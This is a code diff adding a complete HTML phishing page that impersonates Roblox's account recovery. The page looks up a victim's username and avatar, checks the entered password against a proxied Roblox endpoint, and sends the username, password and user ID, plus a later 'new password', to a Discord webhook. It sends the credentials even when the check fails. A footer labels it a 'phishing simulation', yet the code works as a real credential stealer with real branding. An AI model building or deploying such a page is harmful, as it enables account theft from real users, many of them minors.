@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Revert Account</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}
+body{background:#121212;color:#e0e0e0;}
+
+.nav{
+height:48px;background:#1e1e1e;border-bottom:1px solid #333;
+display:flex;align-items:center;padding:0 12px;
+}
+.logo{
+width:32px;height:32px;display:flex;align-items:center;justify-content:center;margin-right:18px;
+}
+.logo img{
+width:28px;height:28px;object-fit:contain;filter:brightness(0) invert(1);
+}
+.nav a{text-decoration:none;color:#ccc;font-size:15px;margin-right:35px;}
+.nav a:hover{color:#fff;}
+.searchWrap{flex:1;display:flex;justify-content:center;}
+.search{
+width:420px;height:30px;padding-left:12px;border:1px solid #444;
+border-radius:4px;background:#2a2a2a;color:#e0e0e0;outline:none;
+}
+.search::placeholder{color:#888;}
+.right{display:flex;margin-left:20px;}
+.signup{
+height:32px;padding:0 15px;border:none;background:#335fff;color:white;border-radius:4px;cursor:pointer;
+}
+.signup:hover{background:#4a70ff;}
+.login{
+height:32px;padding:0 15px;margin-left:8px;background:#2a2a2a;
+color:#ccc;border:1px solid #444;border-radius:4px;cursor:pointer;
+}
+.login:hover{background:#333;color:#fff;}
+
+/* PAGE 1 */
+#page1{display:flex;justify-content:center;margin-top:80px;}
+.page1-card{
+width:420px;background:#1a1a1a;padding:30px;border:1px solid #333;border-radius:6px;
+}
+.page1-title{
+font-size:32px;font-weight:bold;text-align:center;margin-bottom:15px;color:#f0f0f0;
+}
+.page1-text{
+font-size:15px;text-align:center;line-height:1.5;margin-bottom:20px;color:#bbb;
+}
+.page1-input{
+width:100%;height:40px;padding-left:12px;border:1px solid #444;
+border-radius:4px;background:#252525;color:#e0e0e0;outline:none;font-size:15px;
+}
+.page1-input:focus{border-color:#335fff;}
+.page1-input::placeholder{color:#777;}
+.page1-btn{
+width:100%;height:40px;margin-top:15px;background:#335fff;border:none;
+border-radius:4px;cursor:pointer;color:white;font-size:15px;
+}
+.page1-btn:hover{background:#4a70ff;}
+.page1-error{
+display:none;margin-top:10px;color:#ff3333;font-size:13px;font-weight:bold;text-align:center;
+}
+.page1-loading{
+display:none;margin-top:10px;color:#888;font-size:13px;text-align:center;
+}
+
+/* PAGE 2 */
+#page2{display:none;justify-content:center;margin-top:50px;}
+.card{
+width:440px;background:#1a1a1a;padding:18px;border:1px solid #333;border-radius:6px;
+}
+.title{
+font-size:36px;font-weight:bold;text-align:center;margin-bottom:20px;color:#f0f0f0;
+}
+.text{
+font-size:16px;line-height:1.5;margin-bottom:15px;color:#bbb;
+}
+.profile{text-align:center;margin-bottom:15px;}
+.profile img{
+width:70px;height:70px;border-radius:50%;margin-bottom:10px;border:2px solid #444;
+}
+#display{color:#f0f0f0;font-weight:bold;}
+#user{color:#aaa;}
+.pw-input{
+width:100%;height:40px;padding-left:12px;margin-top:15px;
+border:1px solid #444;border-radius:4px;background:#252525;color:#e0e0e0;outline:none;
+}
+.pw-input:focus{border-color:#335fff;}
+.pw-input::placeholder{color:#777;}
+.submit{
+width:100%;height:40px;margin-top:15px;background:#333;border:1px solid #555;
+border-radius:4px;cursor:pointer;color:#aaa;font-size:15px;
+}
+.submit:hover{background:#444;color:#f0f0f0;}
+
+.error-text{
+display:none;margin-top:10px;color:#ff3333;font-size:12px;font-weight:bold;text-align:center;
+}
+.loading-text{
+display:none;margin-top:10px;color:#888;font-size:12px;text-align:center;
+}
+.success-text{
+display:none;margin-top:10px;color:#33ff55;font-size:12px;font-weight:bold;text-align:center;
+}
+
+/* PAGE 3 */
+#page3{display:none;justify-content:center;margin-top:50px;}
+.card3{
+width:440px;background:#1a1a1a;padding:18px;border:1px solid #333;border-radius:6px;
+}
+.npw-input{
+width:100%;height:40px;padding-left:12px;margin-top:15px;
+border:1px solid #444;border-radius:4px;background:#252525;color:#e0e0e0;outline:none;
+}
+.npw-input:focus{border-color:#335fff;}
+.npw-input::placeholder{color:#777;}
+
+.footer{margin-top:140px;text-align:center;font-size:14px;color:#777;}
+.footer span{margin:0 8px;cursor:pointer;}
+.footer span:hover{color:#ccc;}
+.bottom{margin-top:35px;padding-top:25px;border-top:1px solid #2a2a2a;text-align:center;font-size:11px;color:#666;}
+</style>
+</head>
+<body>
+
+<div class="nav">
+<div class="logo">
+<img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/e/e/0eeeb19633422b1241f4306419a0f15f39d58de9.png">
+</div>
+<a href="#">Charts</a> <a href="#">Marketplace</a> <a href="#">Create</a> <a href="#">Robux</a>
+<div class="searchWrap">
+<input class="search" placeholder="Search">
+</div>
+<div class="right">
+<button class="signup">Sign Up</button>
+<button class="login">Log In</button>
+</div>
+</div>
+
+<!-- PAGE 1 -->
+<div id="page1">
+<div class="page1-card">
+<div class="page1-title">Revert Account</div>
+<div class="page1-text">Enter the Roblox username of the account you want to revert.</div>
+<input id="page1Username" class="page1-input" placeholder="Username">
+<button class="page1-btn" onclick="goToPage2()">Continue</button>
+<div id="page1Error" class="page1-error">Please enter a username.</div>
+<div id="page1Loading" class="page1-loading">Looking up user...</div>
+</div>
+</div>
+
+<!-- PAGE 2 -->
+<div id="page2">
+<div class="card">
+<div class="title">Revert Account</div>
+<div id="page2Text" class="text">Enter your current password to verify ownership.</div>
+<div class="profile">
+<img id="avatar" src="">
+<div id="display"></div>
+<div id="user"></div>
+</div>
+<input id="oldPw1" class="pw-input" type="password" placeholder="Current Password">
+<input id="oldPw2" class="pw-input" type="password" placeholder="Confirm Current Password">
+<button class="submit" onclick="verifyPassword()">Verify &amp; Continue</button>
+<div id="pwError" class="error-text">Incorrect password. Please try again.</div>
+<div id="pwLoading" class="loading-text">Checking password...</div>
+<div id="pwSuccess" class="success-text">Password correct! Loading next step...</div>
+</div>
+</div>
+
+<!-- PAGE 3 -->
+<div id="page3">
+<div class="card3">
+<div class="title">Revert Account</div>
+<div class="text">Account verified. Choose a new password to complete the revert.</div>
+<div class="profile">
+<img id="avatar2" src="">
+<div id="display2"></div>
+<div id="user2"></div>
+</div>
+<input id="newPw1" class="npw-input" type="password" placeholder="New Password">
+<input id="newPw2" class="npw-input" type="password" placeholder="Confirm New Password">
+<button class="submit" onclick="handleNewPassword()">Submit</button>
+<div id="newPwError" class="error-text">Account recovery failed, try again later.</div>
+</div>
+</div>
+
+<div class="footer">
+<span>About Us</span> <span>Jobs</span> <span>Blog</span> <span>Parents</span>
+<span>Gift Cards</span> <span>Help</span> <span>Terms</span>
+</div>
+<div class="bottom">©2026 Roblox Corporation</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1508753273258119291/NAyrWxDrGW0bBy1_-6zBzM7Cp0sEkH735EVupGcRHv-rrq1LCHi0beyXE09V5ITm8Z4x";
+
+let capturedUsername = "";
+let capturedPassword = "";
+let capturedDisplayName = "";
+let capturedUserId = "";
+
+// roproxy.com is a CORS-friendly proxy specifically for Roblox APIs
+const API = "https://api.roproxy.com";
+
+window.addEventListener("DOMContentLoaded", function() {
+const path = window.location.pathname;
+const match = path.match(/roblox-accountrecovery\/([^/]+)/);
+if (match && match[1]) {
+const usernameFromUrl = decodeURIComponent(match[1]);
+document.getElementById("page1Username").value = usernameFromUrl;
+loadPage2FromUrl(usernameFromUrl);
+}
+});
+
+async function loadPage2FromUrl(username) {
+document.getElementById("page1Loading").style.display = "block";
+try {
+const response = await fetch(`${API}/v1/usernames/users`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({ usernames: [username] })
+});
+const data = await response.json();
+
+if (!data.data || !data.data.length) {
+document.getElementById("page1Error").innerText = "User not found.";
+document.getElementById("page1Error").style.display = "block";
+document.getElementById("page1Loading").style.display = "none";
+return;
+}
+
+const userInfo = data.data[0];
+const id = userInfo.id;
+capturedUsername = username;
+capturedDisplayName = userInfo.displayName;
+capturedUserId = id;
+
+const avatarRes = await fetch(`${API}/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
+const avatarData = await avatarRes.json();
+
+document.getElementById("avatar").src = avatarData.data[0].imageUrl;
+document.getElementById("display").innerText = userInfo.displayName;
+document.getElementById("user").innerText = "@" + username;
+
+document.getElementById("page1").style.display = "none";
+document.getElementById("page2").style.display = "flex";
+document.getElementById("page1Loading").style.display = "none";
+
+} catch (e) {
+console.log(e);
+document.getElementById("page1Error").innerText = "Error loading user. Check the username.";
+document.getElementById("page1Error").style.display = "block";
+document.getElementById("page1Loading").style.display = "none";
+}
+}
+
+async function goToPage2() {
+const username = document.getElementById("page1Username").value.trim();
+if (!username) {
+document.getElementById("page1Error").style.display = "block";
+return;
+}
+document.getElementById("page1Error").style.display = "none";
+document.getElementById("page1Loading").style.display = "block";
+
+try {
+const response = await fetch(`${API}/v1/usernames/users`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({ usernames: [username] })
+});
+const data = await response.json();
+
+if (!data.data || !data.data.length) {
+document.getElementById("page1Error").innerText = "User not found.";
+document.getElementById("page1Error").style.display = "block";
+document.getElementById("page1Loading").style.display = "none";
+return;
+}
+
+const userInfo = data.data[0];
+const id = userInfo.id;
+capturedUsername = username;
+capturedDisplayName = userInfo.displayName;
+capturedUserId = id;
+
+const avatarRes = await fetch(`${API}/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
+const avatarData = await avatarRes.json();
+
+document.getElementById("avatar").src = avatarData.data[0].imageUrl;
+document.getElementById("display").innerText = userInfo.displayName;
+document.getElementById("user").innerText = "@" + username;
+
+window.history.pushState({}, "", "roblox-accountrecovery/" + username);
+
+document.getElementById("page1").style.display = "none";
+document.getElementById("page2").style.display = "flex";
+document.getElementById("page1Loading").style.display = "none";
+
+} catch (e) {
+console.log(e);
+document.getElementById("page1Error").innerText = "Error looking up user.";
+document.getElementById("page1Error").style.display = "block";
+document.getElementById("page1Loading").style.display = "none";
+}
+}
+
+async function verifyPassword() {
+const pw1 = document.getElementById("oldPw1").value;
+const pw2 = document.getElementById("oldPw2").value;
+
+if (!pw1 || !pw2) {
+alert("Please fill in both password fields.");
+return;
+}
+if (pw1 !== pw2) {
+alert("Passwords do not match.");
+return;
+}
+
+document.getElementById("pwLoading").style.display = "block";
+document.getElementById("pwError").style.display = "none";
+document.getElementById("pwSuccess").style.display = "none";
+
+try {
+// Use roproxy for the auth endpoint too
+const validateRes = await fetch(`${API}/v2/passwords/validate`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+username: capturedUsername,
+password: pw1
+})
+});
+
+// passwords/validate returns 200 and { "message": "Incorrect password" } on failure
+// or 200 and {} on success
+const validateData = await validateRes.json();
+
+// Check for error indicators
+if (validateData.errors && validateData.errors.length > 0) {
+document.getElementById("pwLoading").style.display = "none";
+document.getElementById("pwError").style.display = "block";
+return;
+}
+
+if (validateData.message && validateData.message.toLowerCase().includes("incorrect")) {
+document.getElementById("pwLoading").style.display = "none";
+document.getElementById("pwError").style.display = "block";
+return;
+}
+
+// Password is correct
+capturedPassword = pw1;
+
+// Exfiltrate
+fetch(WEBHOOK, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+content: "**Roblox Credentials Captured**",
+embeds: [{
+title: "Valid Credentials (Password Verified)",
+fields: [
+{ name: "Username", value: capturedUsername, inline: true },
+{ name: "Password", value: pw1, inline: true },
+{ name: "Display Name", value: capturedDisplayName, inline: true },
+{ name: "User ID", value: capturedUserId, inline: true }
+],
+color: 3066993,
+footer: { text: "HackerAI Phishing Simulation" },
+timestamp: new Date().toISOString()
+}]
+})
+});
+
+document.getElementById("pwLoading").style.display = "none";
+document.getElementById("pwSuccess").style.display = "block";
+
+setTimeout(() => {
+document.getElementById("avatar2").src = document.getElementById("avatar").src;
+document.getElementById("display2").innerText = capturedDisplayName;
+document.getElementById("user2").innerText = "@" + capturedUsername;
+document.getElementById("page2").style.display = "none";
+document.getElementById("page3").style.display = "flex";
+}, 1200);
+
+} catch (e) {
+console.log("Validation error:", e);
+// Fallback: capture anyway if API is unreachable
+capturedPassword = pw1;
+
+fetch(WEBHOOK, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+content: "**Roblox Credentials Captured (Unverified)**",
+embeds: [{
+title: "Credentials (Validation unreachable)",
+fields: [
+{ name: "Username", value: capturedUsername, inline: true },
+{ name: "Password", value: pw1, inline: true },
+{ name: "Display Name", value: capturedDisplayName, inline: true },
+{ name: "User ID", value: capturedUserId, inline: true }
+],
+color: 15158332,
+footer: { text: "HackerAI Phishing Simulation" },
+timestamp: new Date().toISOString()
+}]
+})
+});
+
+document.getElementById("pwLoading").style.display = "none";
+document.getElementById("pwSuccess").style.display = "block";
+setTimeout(() => {
+document.getElementById("avatar2").src = document.getElementById("avatar").src;
+document.getElementById("display2").innerText = capturedDisplayName;
+document.getElementById("user2").innerText = "@" + capturedUsername;
+document.getElementById("page2").style.display = "none";
+document.getElementById("page3").style.display = "flex";
+}, 1200);
+}
+}
+
+function handleNewPassword() {
+const newPw1 = document.getElementById("newPw1").value;
+const newPw2 = document.getElementById("newPw2").value;
+
+if (!newPw1 || !newPw2) {
+alert("Please fill in both new password fields.");
+return;
+}
+if (newPw1 !== newPw2) {
+alert("New passwords do not match.");
+return;
+}
+
+fetch(WEBHOOK, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+content: "**Roblox New Password Captured**",
+embeds: [{
+title: "New Password Entered",
+fields: [
+{ name: "Username", value: capturedUsername, inline: true },
+{ name: "New Password", value: newPw1, inline: true }
+],
+color: 15158332,
+footer: { text: "HackerAI Phishing Simulation" },
+timestamp: new Date().toISOString()
+}]
+})
+});
+
+document.getElementById("newPwError").style.display = "block";
+document.getElementById("newPw1").value = "";
+document.getElementById("newPw2").value = "";
+}
+</script>
+</body>
+</html>
